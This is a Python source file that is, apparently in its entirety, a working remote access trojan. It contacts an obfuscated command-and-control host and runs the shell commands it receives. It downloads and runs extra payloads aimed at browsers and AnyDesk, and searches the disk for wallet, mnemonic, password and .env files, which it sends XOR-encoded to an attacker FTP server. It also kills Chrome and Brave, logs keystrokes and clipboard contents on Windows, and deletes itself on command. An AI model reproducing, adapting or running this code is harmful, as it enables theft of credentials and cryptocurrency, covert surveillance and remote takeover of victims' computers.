import base64,platform,socket
from time import sleep
from socket import timeout as TimeOutError
import time
from datetime import datetime,timezone,timedelta
import json,os,struct,subprocess
from threading import Thread,RLock,Timer
import requests,ftplib

# from part1
sType = 'ZU1RINz7'

host="cuMTcx====NjcuMjAzLj"
PORT = 1244
HOST = base64.b64decode(host[10:] + host[:10]).decode()
# end insertion

sHost = socket.gethostname()
host="MxLjIxOA==NDUuNjEuMT"
_T=True;_F=False;_N=None;_A='admin';_O='output'
class Session(object):
    def __init__(A,sock):A.sock=sock;A.info={'type':0,'group':sType,'name':sHost}
    def shutdown(A):
        try:A.sendall('[close]');A.sock.shutdown(socket.SHUT_RDWR);A.sock.close()
        except:pass
    def connect(A,ip,port):A.sock.connect((ip,port));sleep(.5);A.send(code=0,args=A.info);sleep(.5);return _T
    def struct(A,code=_N,args=_N):return json.dumps({'code': code,'args': args})
    def send(A,code=_N,args=_N):d=A.struct(code, args);A.sendall(d)
    def sendall(A,data):
        try:
            try:ii = data.encode()
            except:ii = data
            ii = struct.pack('>I', len(ii)) + ii
            A.sock.sendall(ii)
        except:pass
    def recv(A):
        try:
            ll = A.recvall(4)
            if not ll:return _N
            ml = struct.unpack('>I', ll)[0]
            # Read the message data
            return A.recvall(ml)
        except TimeOutError:return -1
        except:pass
    def recvall(A,size):
        try:
            d = bytearray()
            while len(d) < size:
                pt = A.sock.recv(size - len(d))
                if not pt:return _N
                d.extend(pt)
            return d
        except:return _N

e_buf = ""
def decode_str(ss):
    try:r=ss.decode('utf8');return r
    except:
        try:r=ss.decode('cp1252');return r
        except:
            try:r=ss.decode('mac_roman');return r
            except:return ss

ex_files = ['.exe','.dll','.msi','.dmg','.iso','.pkg','.apk','.xapk','.aar','.ap_','.aab','.dex','.class','.rpm','.deb','.ipa','.dsym','.mp4','.avi','.mp3','.wmv','.wma','.mov','.webm','.avchd','.mkv','.ogg','.mpe','.mpv','.mpeg','.m4p','.m4a','.m4v','.aac','.flac','.aiff','.qt','.flv','.swf','.pyc','.lock','.psd','.pack','.old','.ppt','.pptx','.virtualization','.indd','.eps','.ai','.a','.jar','.so','.o','.wt','.lib','.dylib','.bin','.ffx','.svg','.css','.scss','.gem','.html']
ex_dirs = ['vendor','Pods','node_modules','.git','.next','.externalNativeBuild','sdk','.idea','cocos2d','compose','proj.ios_mac','proj.android-studio','Debug','Release','debug','release','obj','Obj','xcuserdata','.gradle','build','storage','.android','Program Files (x86)','$RECYCLE.BIN','Program Files','Windows','ProgramData','cocoapods','homebrew','.svn','sbin','standalone','local','ruby','man','zsh','Volumes','Applications','Library','System','Pictures','Desktop','usr','android','var','__pycache__','.angular','cache','.nvm','.yarn','.docker','.local','.vscode','.cache','__MACOSX','.pyp','.gem','.config','.rustup','.pyenv','.rvm','.sdkman','.nix-defexpr','.meteor','.nuget','.cargo','.vscode-insiders','.gemexport','.Bin','.oh-my-zsh','.rbenv','.ionic','.mozilla','.var','.cocoapods','.flipper','.forever','.quokka','.continue','.pub-cache','.debris','jdk','.wine32','.phpls','.typeChallenges','.sonarlint','.aptos','.bluemix','.bundle','.cabal','.changes','.changeset','.circleci','.cp','.cpanm','.cxx','.dart_tool','.dartServer','.dbvis','.deps','.devcontainer','.dotnet','.dropbox.cache','.dthumb','.ebcli-virtual-env','.eclipse','eclipse','.electrum','.executables','.exp','.ghcup','.github','.gnupg','.hash','.hasura','.IdentityService','.indexes','.install','.install4j','.kokoro','.localized','.npm','.node-gyp','.p2','.platformio','.plugin_symlinks','.plugins','.store','.storybook','.tmp','tmp','.turbo','.versions','.vs','.vscode-server','.yalc','!azure','x-pack','lib64','site-packages','node_modules12','kibana-8.5.0','google-cloud-sdk','golang.org','Assets.xcassets','arduino','.m2','go']
pat_envs = ['.env','config.js','secret','metamask','wallet','private','mnemonic','password','account','.xls','.xlsx','.doc','.docx','.rtf']
ex1_files = ['.php','.svg','.htm','.hpp','.cpp','.xml','.png','.swift','.ccb','.jsx','.tsx','.h','.java']
ex2_files = ['tsconfig.json','tailwind.config.js','svelte.config.js','next.config.js','babel.config.js','vite.config.js','webpack.config.js','postcss.config.js','robots.txt','license.txt','.ds_store','.angular-config.json','package-lock.json']

def ld(rd,pd):
    dir=os.path.join(rd,pd);res=[];res.append((pd,''));sa = os.listdir(dir)
    for x in sa:
        fn=os.path.join(dir,x)
        try:
            x0 = x.lower()
            if os.path.isfile(fn):
                ff, fe = os.path.splitext(x0)
                if not fe in ex_files and os.path.getsize(fn) < 104857600:res.append((pd, x))
            elif os.path.isdir(fn):
                if not x in ex_dirs and not x0 in ex_dirs:
                    if pd != '':t=pd+'/'+x
                    else:t=x
                    res=res+ld(rd,t)
        except:pass
    return res
def ld0(rd,pd):
    dir=os.path.join(rd,pd);res=[];res.append((pd,''));sa = os.listdir(dir)
    for x in sa:
        if x==ex_dirs[0] or x==ex_dirs[1] or x==ex_dirs[2] or x==ex_dirs[3] or x==ex_dirs[4]:continue
        try:
            fn=os.path.join(dir,x)
            if os.path.isfile(fn):res.append((pd, x))
            elif os.path.isdir(fn):
                if pd != '':t=pd+'/'+x
                else:t=x
                res=res+ld0(rd,t)
        except:pass
    return res
def ld1(rd,pd,pat):
    D=pat;B=pd
    if D=='':return[]
    dir=os.path.join(rd,B);res=[];res.append((B,''));S=os.listdir(dir)
    for x in S:
        fn=os.path.join(dir,x)
        try:
            x0 = x.lower()
            if os.path.isfile(fn):
                ff, fe = os.path.splitext(x0)
                if not fe in ex_files and os.path.getsize(fn)<104857600:
                    if x0.find(D) >= 0: res.append((B, x))
            elif os.path.isdir(fn):
                if not x in ex_dirs and not x0 in ex_dirs:
                    if B != '':t=B+'/'+x
                    else:t=x
                    res=res+ld1(rd,t,D)
        except:pass
    return res
def ld2(rd,pd,pat):
    D=pat;B=pd
    if D=='':return[]
    dir=os.path.join(rd,B);res=[];res.append((B,''));S=os.listdir(dir)
    for x in S:
        fn=os.path.join(dir,x)
        try:
            x0 = x.lower()
            if os.path.isfile(fn):
                ff, fe = os.path.splitext(x0)
                if not fe in ex_files and os.path.getsize(fn)<104857600:
                    if x0.find(D) >= 0: res.append((B, x))            
        except:pass
    return res
def fmt_s(s):
    if s<1024:return str(s)+'B'
    elif s<1048576:return'{:.0f}KB'.format(s/1024.)
    elif s<1073741824:return'{:.1f}MB'.format(s/1048576.)
    else:return'{:.1f}GB'.format(s/1073741824.)
def FM(f,d):
    try:f.mkd(d)
    except:pass

os_type = platform.system()
class Shell(object):
    def __init__(A,S):
        A.sess = S;A.is_alive = _T;A.is_delete = _F;A.lock = RLock();A.timeout_count=0;A.cp_stop=0
        A.par_dir = os.path.join(os.path.expanduser("~"), ".n2")
        A.cmds = {1:A.ssh_obj,2:A.ssh_cmd,3:A.ssh_clip,4:A.ssh_run,5:A.ssh_upload,6:A.ssh_kill,7:A.ssh_any,8:A.ssh_env}

    def listen_recv(A):
        while A.is_alive:
            recv=A.sess.recv()
            if recv==-1:
                if A.timeout_count<30:A.timeout_count+=1;continue
                else:A.timeout_count=0;recv=_N
            if recv:
                A.timeout_count=0
                with A.lock:
                    D=json.loads(recv);c=D['code'];args=D['args']
                    if c in A.cmds:tg=A.cmds[c];t=Thread(target=tg,args=(args,));t.start()#tg(args)
                    else:
                        if A.is_alive:A.is_alive=_F;A.close()
            else:
                if A.is_alive:A.timeout_count=0;A.is_alive=_F;A.close()

    def shell(A):
        t1 = Thread(target=A.listen_recv);t1.daemon=_T;t1.start()
        while A.is_alive:
            try:sleep(5)
            except:break
        A.close()
        return A.is_delete

    def send(A,code=_N,args=_N):A.sess.send(code=code,args=args)
    def sendall(A,m):A.sess.sendall(m)
    def close(A):A.is_alive=_F;A.sess.shutdown()
    def send_n(A,a,n,o):print(o);p={_A:a,_O:o};A.send(code=n,args=p)

    def ssh_cmd(A,args):
        try:
            if args=='delete':o='[close]'
            else:return
        except Exception as e:o=f'Error: {e}'
        A.sendall(o);A.is_delete = _T

    def ssh_obj(A,args):
        try:
            a=args[_A];cmd=args['cmd']
            if cmd == '':o=''
            elif cmd.split()[0] == 'cd':
                proc = subprocess.Popen(cmd, shell=_T)
                if len(cmd.split()) != 1:
                    p=' '.join(cmd.split()[1:])
                    if os.path.exists(p):os.chdir(p)
                o=os.getcwd()
            else:
                proc=subprocess.Popen(cmd,shell=_T,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
                try:o=decode_str(proc[0]);err=decode_str(proc[1])
                except:o=proc[0];err=proc[1]
                o=o if o else err
        except Exception as e:pass
        p={_A:a,_O:o};A.send(code=1, args=p)
    
    def ssh_clip(A,args):
        global e_buf
        try:A.send(code=3, args=e_buf);e_buf = ""
        except:pass

    def down_bro(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass
        
        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2+"/brow/"+sType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_run(A,args):
        try:
            a=args[_A];p=A.par_dir+"/bow";res=A.down_bro(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get browse'
        except Exception as e:o = f'Err4: {e}';pass
        p={_A:a,_O: o};A.send(code=4,args=p)

    def send_5(A,a,o):A.send_n(a,5,o)
    def ssh_upload(A,args):
        try:
            D=args[_A];cmd=args['cmd'];print(str(cmd))
            if 'sdira' in cmd:sdir=cmd['sdira'];dn=cmd['dname'];sdir=sdir.strip();dn=dn.strip();A.ss_upa(D,cmd,sdir,dn);return _T
            elif 'sdir' in cmd:sdir=cmd['sdir'];dn=cmd['dname'];sdir=sdir.strip();dn=dn.strip();A.ss_upd(D,cmd,sdir,dn);return _T
            elif 'sfile' in cmd:sfile=cmd['sfile'];dn=cmd['dname'];sfile=sfile.strip();dn=dn.strip();A.ss_upf(D,cmd,sfile,dn);return _T
            elif 'sfinda' in cmd:sdir=cmd['sfinda'];dn=cmd['dname'];pat=cmd['pat'];sdir=sdir.strip();dn=dn.strip();pat=pat.strip();A.ss_ufind(D,cmd,sdir,dn,pat,1);return _T
            elif 'sfindr' in cmd:sdir=cmd['sfindr'];dn=cmd['dname'];pat=cmd['pat'];sdir=sdir.strip();dn=dn.strip();pat=pat.strip();A.ss_ufind(D,cmd,sdir,dn,pat,0);return _T
            elif 'sfind' in cmd:dn=cmd['dname'];pat=cmd['pat'];dn=dn.strip();pat=pat.strip();A.ss_ufind(D,cmd,'.',dn,pat,1);return _T
            else:A.ss_ups();o='Stopped ...'
        except Exception as e:print(str(e));o = f'Err4: {e}';pass
        A.send_5(D,o)

    def o_ftp(A,args,name):
        hn=args['hn'];un=args['un'];pw=args['pw']
        f=ftplib.FTP(hn,un,pw);f.encoding='utf-8'
        d='DA'+sType;FM(f,d)
        d=d+'/'+sHost;FM(f,d)
        d=d+'/'+name;FM(f,d)
        return (f,d)
    def s_ft(A,G,t,sd,rd,x,y):
        sn=os.path.join(sd,x,y);dn=rd+'/'+x+'/'+y
        try:
            with open(sn,'rb') as f:
                A.storbin(t,dn,f)
                o=' copied ' + fmt_s(os.fstat(f.fileno()).st_size)+':  '+x+' '+y
                f.close();A.send_5(G,o)
        except Exception as e:
            o=' failed: '+sn+' > '+str(e);A.send_5(G,o)

    def ss_upd(A,D,args,sd,name):
        A.cp_stop=0;t=_N
        try:
            if sd=='.':sd=os.getcwd()
            A.send_5(D,' >> upload start: ' + sd)
            res=ld(sd,'')
            A.send_5(D,'  -count: ' + str(len(res)))
            (t,rd)=A.o_ftp(args,name)
            for (x,y) in res:
                if A.cp_stop==1:A.send_5(D,' upload stopped ');return
                if y=='':dn=rd+'/'+str(x);FM(t,dn)
                else:A.s_ft(D,t,sd,rd,x,y)
            t.close()
            A.send_5(D,' uploaded success ')
        except Exception as ex:
            if t is not _N:t.close()
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_upa(A,D,args,sd,name):
        A.cp_stop=0;t=_N
        try:
            if sd=='.':sd=os.getcwd()
            A.send_5(D,' >> upload all start: ' + sd)
            res=ld0(sd,'')
            A.send_5(D,'  -counts: ' + str(len(res)))
            (t,rd)=A.o_ftp(args,name)
            for (x,y) in res:
                if A.cp_stop==1:A.send_5(D,' upload stopped ');return
                if y=='':dn=rd+'/'+str(x);FM(t,dn)
                else:A.s_ft(D,t,sd,rd,x,y)
            t.close()
            A.send_5(D,' uploaded success ')
        except Exception as ex:
            if t is not _N:t.close()
            print(str(ex));o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_upf(A,admin,args,sfile,name):
        D=admin;A.cp_stop=0;t=_N
        try:
            sdir=os.getcwd()
            A.send_5(D,' >> upload start: ' + sdir + ' ' + sfile)
            (t,rd)=A.o_ftp(args,name)
            sn=os.path.join(sdir,sfile);dn=rd+'/'+sfile
            try:
                with open(sn, "rb") as f:
                    A.storbin(t,dn,f)
                    o=' copied ' + fmt_s(os.fstat(f.fileno()).st_size) + ':  ' + sfile
                    f.close();A.send_5(D,o)
            except Exception as e:o=' failed: '+sn+' > '+str(e);A.send_5(D,o)
            t.close()
            A.send_5(D,' uploaded done ')
        except Exception as ex:
            if t is not _N:t.close()
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ufind(A,D,args,sd,name,pat,bsub):
        A.cp_stop=0;t=_N
        try:
            if sd=='.':sd=os.getcwd()
            A.send_5(D,' >> ufind start: ' + sd)
            if bsub==1:res=ld1(sd,'',pat)
            else:res=ld2(sd,'',pat)
            A.send_5(D,'  -count: ' + str(len(res)))
            (t,rd)=A.o_ftp(args,name)
            for (x,y) in res:
                if A.cp_stop==1:A.send_5(D,' ufind stopped ');return
                if y=='':dn=rd+'/'+str(x);FM(t,dn)
                else:A.s_ft(D,t,sd,rd,x,y)
            t.close();A.send_5(D,' ufind success ')
        except Exception as ex:
            if t is not _N:t.close()
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ups(A):A.cp_stop=1

    def f_up(A,a,t,sd,dd,x,y):
        try:
            dn = dd
            for i in x.split('/'):
                dn = dn+'/'+i
                if i not in t.nlst(os.path.dirname(dn)):t.mkd(dn)
            sn=os.path.join(sd,x,y);dn=dd+'/'+x+'/'+y
            with open(sn, "rb") as f:A.storbin(t,dn,f);f.close()
        except:pass

    def ss_ld(A,a,t,sd,dd,pd):
        dir=os.path.join(sd,pd);sa = os.listdir(dir);res=[]
        for x in sa:
            fn=os.path.join(dir,x)
            try:
                x0 = x.lower()
                if os.path.isfile(fn):
                    ff, fe = os.path.splitext(x0)
                    if not x0 in ex2_files and not fe in ex_files and not fe in ex1_files and os.path.getsize(fn)<20971520:
                        for p in pat_envs:
                            if x0.find(p)>=0:A.f_up(a,t,sd,dd,x=pd,y=x);res.append((sd,pd,x));break
                elif os.path.isdir(fn):
                    if not x in ex_dirs and not x0 in ex_dirs:
                        if pd != '':p=pd+'/'+x
                        else:p=x
                        res += A.ss_ld(a,t,sd,dd,p)
            except:pass
        return res
    
    def storbin(A,t,dn,fp):
        ff, fe = os.path.splitext(dn)
        if fe is not None:
            x0 = fe.lower()
            if x0 in ex_files or x0=='.zip' or x0=='.rar' or x0=='.pdf' or x0=='.vmdk':cm=f"STOR {dn}";return t.storbinary(cm,fp)

        cm=f"STOR {dn}.zx_";sk = "G01d*8@("
        t.voidcmd('TYPE I')
        bs = 8192
        with t.transfercmd(cm, None) as conn:
            while 1:
                bf=fp.read(bs)
                if not bf:break
                ll = len(bf)
                d = bytearray();k = 0
                for i in range(ll):
                    k = (i & 7);b = (bf[i] ^ int(ord(sk[k]))) & 0xFF;d.append(b)
                conn.sendall(d)
        return t.voidresp()

    def ssh_env(A,args):
        try:
            a=args[_A];c=args['cmd']
            A.send_n(a,8,'--- uenv start ')
            (t,dd)=A.o_ftp(c,'env_'+str(int(time.time())))

            if os_type == "Windows":
                hd=os.path.expanduser('~')
                dd1=dd+'/doc';FM(t,dd1)
                # A.send_n(a,8,'>> '+hd+'\\Documents')
                A.ss_ld(a,t,hd+'\\Documents',dd1,'')

                dd1=dd+'/down';FM(t,dd1)
                # A.send_n(a,8,'>> '+hd+'\\Downloads')
                A.ss_ld(a,t,hd+'\\Downloads',dd1,'')

                for i in range(67,73):
                    C=chr(i);dd1=dd+'/'+C;FM(t,dd1)
                    # A.send_n(a,8,'>> '+dd1)
                    A.ss_ld(a,t,C+':\\',dd1,'')
            else:
                hd=os.path.expanduser('~')
                dd1=dd+'/home';FM(t,dd1)
                A.ss_ld(a,t,hd,dd1,'')

                hd='/Volumes'
                dd1=dd+'/vol';FM(t,dd1)
                A.ss_ld(a,t,hd,dd1,'')
            t.close()
            A.send_n(a,8,'--- uenv success ')
        except Exception as e:A.send_n(a,8,' uenv err: '+str(e))

    def ssh_kill(A,args):
        D=args[_A]
        if os_type == "Windows":
            try:subprocess.Popen('taskkill /IM chrome.exe /F')
            except:pass
            try:subprocess.Popen('taskkill /IM brave.exe /F')
            except:pass
        else:
            try:subprocess.Popen('killall Google\ Chrome')
            except:pass
            try:subprocess.Popen('killall Brave\ Browser')
            except:pass
        p={_A:D,_O: 'Chrome & Browser are terminated'}
        A.send(code=6,args=p)

    def down_any(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass
        
        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2+"/adc/"+sType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_any(A,args):
        try:
            D=args[_A];p = A.par_dir + "/adc";res=A.down_any(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get anydesk'
        except Exception as e:o = f'Err7: {e}';pass
        p={_A:D,_O:o};A.send(code=7,args=p)

HOST0 = base64.b64decode(host[10:] + host[:10]).decode() 
PORT0 = 1245

class Client():
    def __init__(A):A.server_ip = HOST0;A.server_port = PORT0;A.is_active = _F;A.is_alive = _T;A.timeout_count = 0;A.shell = _N

    @property
    def make_connection(A):
        while _T:
            try:
                A.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s = Session(A.client_socket);s.connect(A.server_ip, A.server_port)
                A.shell = Shell(s);A.is_active = _T
                if A.shell.shell():
                    try:dir = os.getcwd();fn=os.path.join(dir,sys.argv[0]);os.remove(fn)
                    except:pass
                    return _T
                sleep(15)
            except Exception as e:sleep(20);pass
    def run(A):
        if A.make_connection:return

client = Client()

import sys

is_w=sys.platform.startswith('win')
if is_w == _F:
    try:client.run()
    except KeyboardInterrupt:pass
    sys.exit(0)

_M='-m';_P='pip';_L='install'
import subprocess
try:import pyWinhook as pyHook
except:subprocess.check_call([sys.executable,_M,_P,_L,'pyWinhook']);import pyWinhook as pyHook
try:import pyperclip
except:subprocess.check_call([sys.executable,_M,_P,_L,'pyperclip']);import pyperclip
try:import psutil
except:subprocess.check_call([sys.executable,_M,_P,_L,'psutil']);import psutil
try:import win32process
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import win32process
try:import pythoncom
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import pythoncom
try:import win32gui
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import win32gui

def act_win_pn():
    try:pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow());return (pid[-1], psutil.Process(pid[-1]).name())
    except:pass

def write_txt(text):0

c_win = 0

m_win = 0
def hmld(event):
    global e_buf, m_win
    if m_win!=event.Window:m_win=event.Window;tt='<..>'
    else:tt='<.>'
    e_buf+=tt;write_txt(tt);return _T

def hmrd(event):
    global e_buf, m_win
    if m_win!=event.Window:m_win=event.Window;tt='<,,>'
    else:tt='<,>'
    e_buf+=tt;write_txt(tt);return _T

def is_down(status):
    if status == 128: return _T
    return _F

def is_ctl_down():
    return is_down(pyHook.GetKeyState(0x11)) or is_down(pyHook.GetKeyState(0xA2)) or is_down(pyHook.GetKeyState(0xA3))

def check_window(event):
    global c_win
    if c_win != event.Window:
        (pid, text) = act_win_pn()
        tz = timezone(offset=timedelta(hours=9))
        d_t = datetime.fromtimestamp(time.time(), tz)
        t_s = d_t.strftime("%m/%d/%Y, %H:%M:%S")
        
        c_win = event.Window
        return f"\n**\n-[ {text} | PID: {pid}-{c_win}\n-[ @ {t_s} | {event.WindowName}\n**\n"
    return ""

def run_copy_clipboard():
    global e_buf
    try:
        copied = pyperclip.waitForPaste(0.05)
        tt = "\n=================BEGIN================\n"
        tt += copied
        tt += "\n==================END==================\n"
        e_buf += tt;write_txt(tt)
    except Exception as ex:pass

def hkb(event):
    if event.KeyID == 0xA2 or event.KeyID == 0xA3:return _T

    global e_buf
    tt = check_window(event)

    key = event.Ascii
    if (is_ctl_down()):key=f"<^{event.Key}>"
    elif key==0xD:key="\n"
    else:
        if key>=32 and key<=126:key=chr(key)
        else:key=f'<{event.Key}>'
    tt += key
    if is_ctl_down() and event.Key == 'C':
        tmr = Timer(0.1, run_copy_clipboard)
        tmr.start()
    elif is_ctl_down() and event.Key == 'V':
        tmr = Timer(0.1, run_copy_clipboard)
        tmr.start()

    e_buf += tt;write_txt(tt);return _T

def startHk():
    hm = pyHook.HookManager()
    hm.MouseRightDown = hmrd;hm.MouseLeftDown = hmld
    hm.KeyDown = hkb;hm.HookMouse();hm.HookKeyboard()

def hk_loop():startHk();pythoncom.PumpMessages()
def run_client():
    t1=Thread(target=hk_loop);t1.daemon=_T;t1.start()
    try:client.run()
    except KeyboardInterrupt:sys.exit(0)
# run_client()

